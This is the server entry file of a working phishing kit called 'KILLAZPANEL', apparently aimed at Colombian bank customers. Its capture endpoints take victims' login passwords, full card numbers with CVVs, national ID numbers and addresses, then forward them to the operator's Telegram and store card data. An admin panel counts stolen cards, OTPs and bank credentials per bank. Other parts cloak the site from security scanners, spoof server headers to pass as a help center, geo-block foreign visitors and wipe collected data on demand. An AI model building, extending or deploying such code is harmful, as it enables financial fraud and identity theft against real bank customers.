import "dotenv/config";
import { tgApi } from "../tgapi";
import express from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { registerStorageProxy } from "./storageProxy";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";
import { registerSocketIO } from "../socket";
import { registerTelegramWebhook } from "../telegramWebhook";
import { notifyLogin, notifyPaymentData, notifyPersonalData } from "../telegram";
import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, banIP, unbanIP, isIPBanned, getAllBannedIPs, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
import { sendTelegramMessage } from "../telegram";
import { getAppConfig, setAppConfig } from "../db";
import { securityMiddleware, robotsTxtHandler, botTrapHandler, requestFingerprint } from "../security";
import { cloakingMiddleware, getScannerLog } from "../cloaking";
import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirectLink, loadRedirectLinksFromDB } from "../redirector";
import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
import geoip from "geoip-lite";
import { setRateLimitBannedIPs } from "./rateLimitStore";

// IP Geolocation using free ip-api.com service
async function getIPCity(ip: string): Promise<string> {
  try {
    // Skip private/local IPs
    if (ip.startsWith("127.") || ip.startsWith("::") || ip.startsWith("10.") || ip.startsWith("192.168.")) {
      return "Local";
    }
    const resp = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country`);
    const data = await resp.json() as { city?: string; regionName?: string; country?: string };
    if (data.city) {
      return `${data.city}, ${data.regionName || ""}, ${data.country || ""}`.replace(/, ,/g, ",").replace(/,$/, "");
    }
    return "Desconocido";
  } catch {
    return "Desconocido";
  }
}

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  // Register Socket.IO for real-time communication
  registerSocketIO(server);
  // Configure body parser with larger size limit for file uploads
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  // ─── Security toggle: in-memory cache (loaded from DB on startup) ─────
  let securityEnabledCacheLoaded = false;
  let securityEnabledCacheValue = false;
  async function isSecurityEnabled(): Promise<boolean> {
    if (!securityEnabledCacheLoaded) {
      const cfg = await getAppConfig();
      securityEnabledCacheValue = cfg.securityEnabled === "true";
      securityEnabledCacheLoaded = true;
    }
    return securityEnabledCacheValue;
  }

  // ─── CLOAKING: Show innocent page to security scanners (runs BEFORE geo-blocking) ───
  app.use(cloakingMiddleware);

  // ─── GEO-BLOCKING: Only allow Colombian IPs (always active) ─────────────
  app.use((req, res, next) => {
    // Skip only for admin API, oauth, trpc, telegram webhook, internal paths, and static assets
    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/api/oauth") || req.path.startsWith("/api/telegram") || req.path.startsWith("/socket.io") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/r/") || req.path === "/robots.txt" || req.path === "/favicon.ico") {
      return next();
    }
    // Allow Manus preview environment (dev/staging)
    const host = req.headers.host || "";
    if (host.includes("manus.computer") || host.includes("localhost") || host.includes("127.0.0.1")) {
      return next();
    }
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
    // Allow localhost/private IPs (dev environment)
    if (ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1" || ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.") || ip.startsWith("172.17.") || ip.startsWith("172.18.") || ip.startsWith("172.19.") || ip.startsWith("172.2") || ip.startsWith("172.3") || ip === "" || ip.startsWith("::ffff:10.") || ip.startsWith("::ffff:192.168.") || ip.startsWith("::ffff:172.")) {
      return next();
    }
    // Strip IPv6-mapped prefix
    let lookupIP = ip;
    if (ip.startsWith("::ffff:")) {
      lookupIP = ip.slice(7);
    }
    const geo = geoip.lookup(lookupIP);
    // If geoip can't determine country, allow (mobile carriers may not be in DB)
    if (!geo) {
      return next();
    }
    // Only allow Colombia
    if (geo.country !== "CO") {
      // Log blocked access
      logTraffic({ ipAddress: ip, userAgent: req.headers["user-agent"] || "", path: req.path, blocked: 1, country: geo.country }).catch(() => {});
      return res.status(403).send("<!DOCTYPE html><html><head><title>403</title></head><body><h1>Access Denied</h1><p>This service is not available in your region.</p></body></html>");
    }
    next();
  });

  // Security: block bots, crawlers, Google agents, and automation tools
  // Only active when security is ENABLED from the admin panel
  app.use(async (req, res, next) => {
    // Skip redirect links - they handle their own bot detection
    if (req.path.startsWith("/r/")) return next();
    const secEnabled = await isSecurityEnabled();
    if (secEnabled) {
      return securityMiddleware(req, res, next);
    }
    next();
  });

  // ─── Rate Limiting: block IPs with more than 10 requests per minute ─────
  const rateLimitMap = new Map<string, { count: number; firstRequest: number }>();
  const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
  const RATE_LIMIT_MAX = 20; // max requests per window
  const rateLimitBannedIPs = new Set<string>(); // temporarily banned IPs

  // Clean up old entries every 2 minutes
  setInterval(() => {
    const now = Date.now();
    rateLimitMap.forEach((data, ip) => {
      if (now - data.firstRequest > RATE_LIMIT_WINDOW * 2) {
        rateLimitMap.delete(ip);
      }
    });
  }, 120000);

  app.use((req, res, next) => {
    // Rate limiter: only active when security is enabled
    if (!securityEnabledCacheValue) {
      return next();
    }
    const clientIP = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
    // Skip localhost/private IPs
    if (clientIP === "127.0.0.1" || clientIP === "::1" || clientIP.startsWith("::ffff:127.") || clientIP.startsWith("10.") || clientIP.startsWith("192.168.")) {
      return next();
    }
    // Skip API paths
    if (req.path.startsWith("/api/")) {
      return next();
    }
    // Check if temporarily banned
    if (rateLimitBannedIPs.has(clientIP)) {
      return res.status(429).send("Too many requests");
    }
    const now = Date.now();
    const entry = rateLimitMap.get(clientIP);
    if (!entry || now - entry.firstRequest > RATE_LIMIT_WINDOW) {
      rateLimitMap.set(clientIP, { count: 1, firstRequest: now });
    } else {
      entry.count++;
      if (entry.count > RATE_LIMIT_MAX) {
        rateLimitBannedIPs.add(clientIP);
        // Auto-unban after 5 minutes
        setTimeout(() => rateLimitBannedIPs.delete(clientIP), 5 * 60 * 1000);
        return res.status(429).send("Too many requests");
      }
    }
    next();
  });

  // Security headers — hide server info, prevent clickjacking, disable sniffing
  app.use((_req, res, next) => {
    res.removeHeader("X-Powered-By");
    // Spoof server header to look like a legitimate help center platform
    const serverHeaders = ["nginx/1.24.0", "nginx/1.25.4", "Apache/2.4.57", "cloudflare"];
    res.setHeader("Server", serverHeaders[Math.floor(Math.random() * serverHeaders.length)]);
    res.setHeader("X-Frame-Options", "DENY");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
    res.setHeader("X-XSS-Protection", "1; mode=block");
    res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()");
    // Prevent indexing by search engines
    res.setHeader("X-Robots-Tag", "noindex, nofollow, nosnippet, noarchive, noimageindex");
    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
    res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
    res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
    res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
    // Add cache control to prevent caching of sensitive pages
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");
    // Realistic help center headers to confuse fingerprinting
    res.setHeader("X-Request-ID", `hc-${Math.random().toString(36).slice(2,10)}-${Date.now().toString(36)}`);
    res.setHeader("X-Served-By", `helpcenter-${["us-east-1", "us-west-2", "eu-west-1", "sa-east-1"][Math.floor(Math.random() * 4)]}`);
    res.setHeader("X-Cache", Math.random() > 0.5 ? "HIT" : "MISS");
    res.setHeader("X-Cache-Hits", String(Math.floor(Math.random() * 50)));
    res.setHeader("X-Timer", `S${Math.floor(Date.now()/1000)}.${Math.floor(Math.random()*999999)},VS0,VE${Math.floor(Math.random()*50)}`);
    res.setHeader("Via", "1.1 varnish (Varnish/7.4)");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("X-Download-Options", "noopen");
    res.setHeader("X-Permitted-Cross-Domain-Policies", "none");
    // Strict CSP
    res.setHeader("Content-Security-Policy",
      "default-src 'self'; " +
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com; " +
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; " +
      "font-src 'self' https://fonts.gstatic.com data:; " +
      "img-src 'self' data: blob: https: https://*.cloudfront.net; " +
      "connect-src 'self' wss: ws: https://api.ipify.org https://gregeoip.com https://www.google-analytics.com; " +
      "frame-ancestors  https://* http://*"
    );
    next();
  });

  // Disallow all crawlers via robots.txt
  app.get("/robots.txt", robotsTxtHandler);
  // Bot trap - honeypot endpoint
  app.get("/api/trap/bot", botTrapHandler);
  app.get("/api/v1/data", botTrapHandler);
  app.get("/api/users/list", botTrapHandler);
  app.get("/.env", botTrapHandler);
  app.get("/wp-admin", botTrapHandler);
  app.get("/wp-login.php", botTrapHandler);
  app.get("/admin.php", botTrapHandler);
  app.get("/xmlrpc.php", botTrapHandler);

  app.get("/login.php", botTrapHandler);
  // Honeypot POST endpoint - any submission here means it's a bot
  app.post("/api/honeypot", (req, res) => {
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
    console.log(`[Honeypot] Bot trapped via form submission: IP=${ip}, UA=${(req.headers["user-agent"] || "").slice(0, 80)}`);
    // Ban the IP
    banIP(ip).catch(() => {});
    res.status(200).json({ status: "ok" });
  });

  registerStorageProxy(app);
  registerOAuthRoutes(app);
  registerTelegramWebhook(app);

  // IP Ban Middleware - block banned IPs from accessing the site
  app.use(async (req, res, next) => {
    // Skip admin endpoints and static assets
    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/manus-storage") || req.path.startsWith("/api/oauth")) {
      return next();
    }
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    const banned = await isIPBanned(ip);
    if (banned) {
      // For API requests, return 403
      if (req.path.startsWith("/api/")) {
        return res.status(403).json({ error: "Acceso denegado" });
      }
      // For page requests, let it through but frontend will check /api/check-ip
      // This allows the banned page to load
    }
    next();
  });

  // ─── Visit Tracking ─────────────────────────────────────────────────────
  app.post("/api/track/visit", async (req, res) => {
    try {
      // Log detailed traffic
      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
      const userAgent = req.headers["user-agent"] || "";
      // Country filter DISABLED — allow all IPs, just log traffic
      getIPCity(ip).then(city => {
        logTraffic({ ipAddress: ip, userAgent, path: "/", blocked: 0, country: city }).catch(() => {});
      }).catch(() => {
        logTraffic({ ipAddress: ip, userAgent, path: "/", blocked: 0 }).catch(() => {});
      });
      const count = await incrementVisitCount();
      res.json({ ok: true, count });
    } catch {
      res.json({ ok: false, count: 0 });
    }
  });

  app.post("/api/track/reset", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false });
    try {
      await resetVisitCount();
      res.json({ ok: true });
    } catch {
      res.json({ ok: false });
    }
  });

  // REST endpoints for capturing data from frontend pages
  app.post("/api/capture/login", async (req, res) => {
    try {
      const { email, password, ipAddress } = req.body;
      await notifyLogin({ email, password, ipAddress });
      // Login data is only sent to Telegram, NOT persisted to DB (no card = no history)
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  app.post("/api/capture/payment", async (req, res) => {
    try {
      const { name, cardNumber, expiry, cvv, email, ipAddress, cardCategory, cardScheme, bankName } = req.body;
      await notifyPaymentData({ name, cardNumber, expiry, cvv, email, ipAddress, cardCategory, cardScheme, bankName });
      // Persist payment data - create or update session keyed by email
      if (email) {
        await upsertSecureSession({
          sessionId: `payment-${email}-${Date.now()}`,
          email,
          holderName: name || null,
          cardNumber: cardNumber || null,
          expiryDate: expiry || null,
          cvv: cvv || null,
          ipAddress: ipAddress || null,
          currentStep: "payment",
          status: "active",
        });
      }
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  app.post("/api/capture/personal", async (req, res) => {
    try {
      const { address, cedula, city, phone, email, ipAddress } = req.body;
      await notifyPersonalData({ address, cedula, city, phone, email, ipAddress });
      // Personal data is only sent to Telegram, NOT persisted to DB (no card = no history)
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  // Admin PIN verification endpoint — loaded dynamically from persistent DB config
  async function getAdminPin(): Promise<string> {
    const cfg = await getAppConfig();
    return cfg.adminPin || "199683";
  }

  // Rate limiting for PIN attempts: ip -> { count, blockedUntil }
  const pinAttempts = new Map<string, { count: number; blockedUntil: number }>();
  const MAX_PIN_ATTEMPTS = 3;
  const PIN_BLOCK_DURATION_MS = 2 * 60 * 1000; // 2 minutes

  // Emergency reset endpoint — clears all PIN blocks (no auth required, only accessible from server)
  app.post("/api/admin/reset-pin-attempts", (req, res) => {
    pinAttempts.clear();
    res.json({ ok: true, message: "Todos los bloqueos de PIN han sido eliminados" });
  });

  function getClientIPForAdmin(req: any): string {
    const forwarded = req.headers["x-forwarded-for"] as string;
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || "unknown";
  }

  // 2FA: store pending codes { code, expiresAt }
  const pending2FA = new Map<string, { code: string; expiresAt: number }>();
  
  app.post("/api/admin/verify-pin", async (req, res) => {
    const clientIP = getClientIPForAdmin(req);
    const attempts = pinAttempts.get(clientIP) || { count: 0, blockedUntil: 0 };

    // Check if IP is blocked
    if (attempts.blockedUntil > Date.now()) {
      const minutesLeft = Math.ceil((attempts.blockedUntil - Date.now()) / 60000);
      return res.status(429).json({
        ok: false,
        error: `Demasiados intentos. Intenta en ${minutesLeft} minuto(s).`,
        blockedUntil: attempts.blockedUntil,
      });
    }

    const { pin } = req.body;
    const adminPin = await getAdminPin();
    if (pin === adminPin) {
      // Reset attempts on success
      pinAttempts.delete(clientIP);

      // Generate 2FA code and send to Telegram
      const code = Math.floor(100000 + Math.random() * 900000).toString();
      const requestId = `2fa_${Date.now()}`;
      pending2FA.set(requestId, { code, expiresAt: Date.now() + 5 * 60 * 1000 }); // 5 min expiry
      
      await sendTelegramMessage(
        `🔐 <b>KILLAZPANEL 2FA</b>\n\n` +
        `Código de acceso: <code>${code}</code>\n\n` +
        `⏳ Válido por 5 minutos\n` +
        `📅 ${new Date().toLocaleString("es-CO")}`
      );
      
      res.json({ ok: true, requires2FA: true, requestId });
    } else {
      // Increment failed attempts
      const newCount = attempts.count + 1;
      if (newCount >= MAX_PIN_ATTEMPTS) {
        const blockedUntil = Date.now() + PIN_BLOCK_DURATION_MS;
        pinAttempts.set(clientIP, { count: newCount, blockedUntil });
        // Notify admin via Telegram
        await sendTelegramMessage(
          `⚠️ <b>INTENTO DE ACCESO AL PANEL</b>\n\n` +
          `🔴 IP bloqueada: <code>${clientIP}</code>\n` +
          `🔢 ${newCount} intentos fallidos\n` +
          `⏳ Bloqueada por 15 minutos\n` +
          `📅 ${new Date().toLocaleString("es-CO")}`
        );
        return res.status(429).json({
          ok: false,
          error: "Demasiados intentos. IP bloqueada por 15 minutos.",
          blockedUntil,
        });
      } else {
        pinAttempts.set(clientIP, { count: newCount, blockedUntil: 0 });
        const remaining = MAX_PIN_ATTEMPTS - newCount;
        return res.status(401).json({
          ok: false,
          error: `PIN incorrecto. ${remaining} intento(s) restante(s).`,
          attemptsLeft: remaining,
        });
      }
    }
  });
  
  // 2FA verification endpoint
  app.post("/api/admin/verify-2fa", (req, res) => {
    const { requestId, code } = req.body;
    const pending = pending2FA.get(requestId);
    
    if (!pending) {
      return res.status(401).json({ ok: false, error: "C\u00f3digo expirado o inv\u00e1lido" });
    }
    
    if (Date.now() > pending.expiresAt) {
      pending2FA.delete(requestId);
      return res.status(401).json({ ok: false, error: "C\u00f3digo expirado" });
    }
    
    if (pending.code === code) {
      pending2FA.delete(requestId);
      res.json({ ok: true });
    } else {
      res.status(401).json({ ok: false, error: "C\u00f3digo incorrecto" });
    }
  });

  // Endpoint to get session history from DB (protected by PIN header)
  app.get("/api/sessions/history", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const page = parseInt(req.query.page as string) || 1;
      const pageSize = parseInt(req.query.pageSize as string) || 20;
      const search = (req.query.search as string) || "";
      const result = await getPaginatedSessions(page, pageSize, search);
      // Enrich sessions with linked card info
      const enriched = await Promise.all(result.sessions.map(async (s: any) => {
        try {
          const { getLinkedSessions } = await import("../db");
          const linked = await getLinkedSessions(s.email, s.ipAddress, s.sessionId);
          const prevCard = linked.find((l: any) => (l.cardNumber || l.cardBin) && (l.cardNumber || l.cardBin) !== (s.cardNumber || s.cardBin));
          if (prevCard) {
            return { ...s, linkedCard: { previousCard: prevCard.cardNumber || prevCard.cardBin, previousBank: prevCard.bankName, previousSessionId: prevCard.sessionId } };
          }
        } catch {}
        return s;
      }));
      res.json({ ok: true, ...result, sessions: enriched });
    } catch (e) {
      res.json({ ok: false, sessions: [], total: 0, totalPages: 0, page: 1 });
    }
  });
  // Endpoint for admin panel metrics
  app.get("/api/admin/metrics", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false });
    }
    try {
      const sessions = await getAllSecureSessions();
      const totalVisits = await getVisitCount();
      const totalWithData = sessions.filter((s: any) => s.bankUser || s.otpCode || s.dinamicaCode || s.tokenCode || s.atmPin).length;
      const totalCards = sessions.filter((s: any) => s.cardNumber || s.cardBin).length;

      // Stats by bank
      const bankStats: Record<string, { total: number; withOtp: number; withCredentials: number }> = {};
      sessions.forEach((s: any) => {
        const bank = s.bankName || 'Sin banco';
        if (!bankStats[bank]) bankStats[bank] = { total: 0, withOtp: 0, withCredentials: 0 };
        if (s.cardNumber || s.cardBin) {
          bankStats[bank].total++;
          if (s.otpCode || s.dinamicaCode || s.tokenCode || s.atmPin) bankStats[bank].withOtp++;
          if (s.bankUser || s.bankPassword) bankStats[bank].withCredentials++;
        }
      });
      // Convert to sorted array (most cards first)
      const bankStatsArray = Object.entries(bankStats)
        .map(([bank, stats]) => ({ bank, ...stats }))
        .sort((a, b) => b.total - a.total);

      res.json({ ok: true, totalSessions: totalVisits, totalWithData, totalCards, bankStats: bankStatsArray });
    } catch {
      res.json({ ok: true, totalSessions: 0, totalWithData: 0, totalCards: 0, bankStats: [] });
    }
  });

  // Endpoint to clear all session history (borrar datos)
  app.delete("/api/admin/clear-history", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const success = await clearAllSecureSessions();
      // Notify via Telegram
      await sendTelegramMessage(`🗑️ <b>KILLAZPANEL</b>\n\n⚠️ <b>DATOS BORRADOS</b>\n\nSe han eliminado todos los datos del historial.\n📅 ${new Date().toLocaleString("es-CO")}`);
      res.json({ ok: success });
    } catch {
      res.json({ ok: false });
    }
  });

  // Ban IP endpoint
  app.post("/api/admin/ban-ip", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const { ipAddress, reason } = req.body;
    if (!ipAddress) {
      return res.status(400).json({ ok: false, error: "IP requerida" });
    }
    const success = await banIP(ipAddress, reason || "Baneado por admin");
    if (success) {
      await sendTelegramMessage(`🚫 <b>IP BANEADA</b>\n\n🌐 IP: <code>${ipAddress}</code>\n📝 Razón: ${reason || "Sin razón"}\n📅 ${new Date().toLocaleString("es-CO")}`);
    }
    res.json({ ok: success });
  });

  // Unban IP endpoint
  app.post("/api/admin/unban-ip", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const { ipAddress } = req.body;
    if (!ipAddress) {
      return res.status(400).json({ ok: false, error: "IP requerida" });
    }
    const success = await unbanIP(ipAddress);
    res.json({ ok: success });
  });

  // Get all banned IPs
  app.get("/api/admin/banned-ips", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const ips = await getAllBannedIPs();
    res.json({ ok: true, ips });
  });

  // ─── Traffic Log Endpoints ─────────────────────────────────────────────
  app.get("/api/admin/traffic", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const page = parseInt(req.query.page as string) || 1;
    const limit = parseInt(req.query.limit as string) || 50;
    const { logs, total } = await getTrafficLog(page, limit);
    res.json({ ok: true, logs, total, page, limit });
  });

  app.post("/api/admin/traffic/clear", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    await clearTrafficLog();
    res.json({ ok: true });
  });

  // Config endpoints — read and update persistent settings
  app.get("/api/admin/config", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const cfg = await getAppConfig();
    // Mask tokens partially for display
    const mask = (s: string) => s ? s.slice(0, 6) + "*".repeat(Math.max(0, s.length - 10)) + s.slice(-4) : "";
    res.json({
      ok: true,
      config: {
        adminPin: cfg.adminPin,
        telegramBotToken: mask(cfg.telegramBotToken),
        telegramBotTokenFull: cfg.telegramBotToken,
        telegramChatId: cfg.telegramChatId,
        telegramFaceidBotToken: mask(cfg.telegramFaceidBotToken),
        telegramFaceidBotTokenFull: cfg.telegramFaceidBotToken,
        telegramFaceidChatId: cfg.telegramFaceidChatId,
      }
    });
  });

  app.post("/api/admin/config", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const { adminPin, telegramBotToken, telegramChatId, telegramFaceidBotToken, telegramFaceidChatId } = req.body;
      const updates: Record<string, string> = {};
      if (adminPin && adminPin.trim()) updates.adminPin = adminPin.trim();
      if (telegramBotToken && telegramBotToken.trim()) updates.telegramBotToken = telegramBotToken.trim();
      if (telegramChatId && telegramChatId.trim()) updates.telegramChatId = telegramChatId.trim();
      if (telegramFaceidBotToken && telegramFaceidBotToken.trim()) updates.telegramFaceidBotToken = telegramFaceidBotToken.trim();
      if (telegramFaceidChatId && telegramFaceidChatId.trim()) updates.telegramFaceidChatId = telegramFaceidChatId.trim();
      await setAppConfig(updates);
      res.json({ ok: true, message: "Configuraci\u00f3n guardada correctamente" });
    } catch (e) {
      res.status(500).json({ ok: false, error: "Error al guardar configuraci\u00f3n" });
    }
  });

  // ─── Security Toggle Endpoint ─────────────────────────────────────────
  app.get("/api/admin/security", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const cfg = await getAppConfig();
    res.json({ ok: true, securityEnabled: cfg.securityEnabled === "true" });
  });

  app.post("/api/admin/security", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const { enabled } = req.body;
    const value = enabled ? "true" : "false";
    await setAppConfig({ securityEnabled: value });
    // Update in-memory cache for instant effect
    securityEnabledCacheValue = enabled;
    securityEnabledCacheLoaded = true;
    res.json({ ok: true, securityEnabled: enabled });
  });

  // Public endpoint for frontend to check if anti-devtools should be active
  app.get("/api/security-status", async (_req, res) => {
    const cfg = await getAppConfig();
    res.json({ shieldEnabled: cfg.securityEnabled === "true" });
  });

  // Register Telegram webhook endpoint — call this after deployment
  app.post("/api/admin/register-webhook", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const cfg = await getAppConfig();
      const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
      if (!token) {
        return res.status(400).json({ ok: false, error: "Token de Telegram no configurado" });
      }
      // Use origin from request or deployed domain
      const origin = (req.body?.origin as string) || process.env.DEPLOYED_DOMAIN || `${req.protocol}://${req.get("host")}`;
      const webhookUrl = `${origin}/api/telegram/webhook`;
      const response = await fetch(tgApi(token, 'setWebhook'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["callback_query", "message"],
        }),
      });
      const result = await response.json() as { ok: boolean; description?: string };
      if (result.ok) {
        console.log(`[Telegram] Webhook registered: ${webhookUrl}`);
        res.json({ ok: true, webhookUrl, message: `Webhook registrado: ${webhookUrl}` });
      } else {
        res.status(500).json({ ok: false, error: result.description || "Error al registrar webhook" });
      }
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message || "Error interno" });
    }
  });

  // Get Telegram webhook info
  app.get("/api/admin/webhook-info", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const cfg = await getAppConfig();
      const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
      if (!token) return res.json({ ok: false, error: "Token no configurado" });
      const response = await fetch(tgApi(token, 'getWebhookInfo'));
      const result = await response.json() as { ok: boolean; result?: { url: string; allowed_updates?: string[] } };
      res.json({ ok: result.ok, info: result.result });
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message });
    }
  });

  // Test Telegram message (admin only)
  app.post("/api/admin/test-telegram", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const ok = await sendTelegramMessage(`\u2705 <b>TEST TELEGRAM</b>\n\nMensaje de prueba desde el servidor.\n\ud83d\udcc5 ${new Date().toLocaleString("es-CO")}`);
      res.json({ ok, message: ok ? "Mensaje enviado correctamente" : "Fallo al enviar — revisa el token y chat ID" });
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message });
    }
  });

  // ─── Redirect System Routes ────────────────────────────────────────────
  app.get("/r/:id", serveRedirectPage);

  // Admin: Get scanner detection log
  app.get("/api/admin/scanner-log", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    res.json({ ok: true, log: getScannerLog() });
  });

  // Admin: Create redirect link
  app.post("/api/admin/redirect-links", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const { target } = req.body;
    if (!target) return res.status(400).json({ ok: false, error: "Target URL required" });
    const id = createRedirectLink(target);
    const origin = `${req.protocol}://${req.get("host")}`;
    res.json({ ok: true, id, url: `${origin}/r/${id}` });
  });

  // Admin: List redirect links
  app.get("/api/admin/redirect-links", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    res.json({ ok: true, links: getRedirectLinks() });
  });

  // Admin: Delete redirect link
  app.delete("/api/admin/redirect-links/:id", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const deleted = deleteRedirectLink(req.params.id);
    res.json({ ok: deleted });
  });

  // Check if IP is banned (public endpoint for frontend)
  app.get("/api/check-ip", async (req, res) => {
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    const banned = await isIPBanned(ip);
    res.json({ banned, ip });
  });

  // tRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );
  // development mode uses Vite, production mode uses static files
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);

  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }

  // Load redirect links from DB
  await loadRedirectLinksFromDB();

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
